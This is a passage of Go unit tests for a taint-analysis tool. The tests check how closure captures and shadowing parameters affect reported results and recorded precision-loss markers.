func TestClosureCaptureOfCleanValueIsNotRecorded(t *testing.T) {
	rep := run(t, fxCaptureClean)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if slices.Contains(rep.PrecisionLoss, "closure-capture") {
		t.Fatalf("precision loss = %v, want no closure-capture for an untainted capture", rep.PrecisionLoss)
	}
}

// TestClosureParameterIsNotACapture separates the two ways an outer name can
// reappear inside a closure. A parameter that happens to share an outer
// variable's name is the closure's OWN binding and receives nothing from the
// enclosing scope, so nothing is dropped and nothing is reported. Treating it
// as a capture would both raise a useless marker and re-open the shadowing
// false positive that scoping closures exists to prevent.
func TestClosureParameterIsNotACapture(t *testing.T) {
	rep := run(t, fxCaptureParamShadow)
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none for a shadowing parameter", rep.Results)
	}
	if slices.Contains(rep.PrecisionLoss, "closure-capture") {
		t.Fatalf("precision loss = %v, want no closure-capture for a parameter", rep.PrecisionLoss)
	}
}

// TestCaptureThenReassignStaysClean guards the false positive that rules out
// seeding captured taint into the body. The include reads a local literal, so
// the file is clean and must report no result. The capture itself is still a
// real drop and is still recorded.
func TestCaptureThenReassignStaysClean(t *testing.T) {
	rep := run(t, fxCaptureThenReassign)
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none when the capture is reassigned before use", rep.Results)
	}
	if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
		t.Fatalf("precision loss = %v, want the dropped capture still recorded", rep.PrecisionLoss)
	}
}
